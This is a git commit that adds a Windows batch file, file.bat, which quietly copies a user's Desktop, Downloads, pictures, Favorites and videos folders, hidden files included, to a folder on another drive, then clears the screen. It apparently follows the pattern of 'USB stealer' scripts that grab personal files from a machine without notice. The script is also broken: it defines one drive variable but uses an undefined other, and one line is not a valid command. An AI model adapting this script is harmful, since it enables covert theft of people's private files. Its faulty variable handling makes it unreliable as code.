882af8a358f4278f7d1ae5a042b367ecc55d5dd1
Pycodd123 <94187777+Pycodd123@users.noreply.github.com>
2022-06-13 13:36:18 -0700

    Add files via upload

---
+++ file.bat
@@ -0,0 +1,13 @@
+@echo off 
+:: variables
+/min
+SET odrive=%odrive:~0,2%
+set backupcmd=xcopy /s /c /d /e /h /i /r /y
+echo off
+%backupcmd% "%USERPROFILE%\Desktop" "%drive%\all\Desktop"
+%backupcmd% "%USERPROFILE%\Downloads" "%drive%\all\downloads"
+%backupcmd% "%USERPROFILE%\pictures" "%drive%\all\My pics"
+%backupcmd% "%USERPROFILE%\Favorites" "%drive%\all\Favorites"
+%backupcmd% "%USERPROFILE%\videos" "%drive%\all\vids"
+@echo off
+cls
